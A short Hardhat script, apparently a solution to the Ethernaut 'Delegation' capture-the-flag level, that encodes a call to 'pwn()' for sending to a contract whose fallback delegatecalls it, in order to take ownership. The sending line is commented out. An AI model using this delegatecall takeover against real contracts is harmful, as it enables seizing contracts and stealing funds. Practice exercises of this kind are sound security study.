import { ethers } from "hardhat";
import fs from "fs";
import path from "path";

async function main() {
  // get contract by address & abi
  const instanceAddress = "0xf3b891850Ab783CD137225d67b89270Ed82B3813";

  const abiPath = path.join(__dirname, "..", "abis", "delegation.json");
  if (!fs.existsSync(abiPath)) {
    console.error(`ABI file not found at ${abiPath}`);
    process.exit(1);
  }
  const abiJson = JSON.parse(fs.readFileSync(abiPath, "utf8"));

  const [signer] = await ethers.getSigners();

  const contract = new ethers.Contract(instanceAddress, abiJson, signer);
  console.log("Attached to contract:", contract.target);

  // function call
  const delegateAbi = ["function pwn()"];
  const iface = new ethers.Interface(delegateAbi);

  const encoded = iface.encodeFunctionData("pwn", []);
  console.log(encoded);

  // await signer.sendTransaction({ to: instanceAddress, data: encoded });

  console.log(await contract.owner());
}

main().catch((err) => {
  console.error("Error:", err);
  process.exitCode = 1;
});
